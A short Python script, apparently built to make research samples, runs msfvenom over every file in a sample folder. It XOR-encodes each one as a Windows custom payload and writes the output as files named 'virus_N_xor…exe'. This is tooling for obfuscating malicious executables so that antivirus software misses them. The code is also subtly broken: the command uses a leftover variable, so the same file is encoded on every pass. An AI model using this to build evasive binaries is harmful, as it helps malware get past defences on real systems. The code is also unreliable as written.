import os



sample = os.listdir("test_small_sample")
files = []

for i in sample:
    path = 'test_small_sample/'
    file = path + i
    files.append(file)


num_iteraciones = 1
cont = 1
path_destino = 'test_small_sample_encoded_xor'
for i in files:
    command = "msfvenom -p generic/custom payloadfile={} -a x86 --platform windows -e x86/xor_dynamic -i {} -f exe -o {}/virus_{}_xor{}it.exe".format(file,num_iteraciones , path_destino , cont , num_iteraciones)
    os.system(command)
    cont += 1


